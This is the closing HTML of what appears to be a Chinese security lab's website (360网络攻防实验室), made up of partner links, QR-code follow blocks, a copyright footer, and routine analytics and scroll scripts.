                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
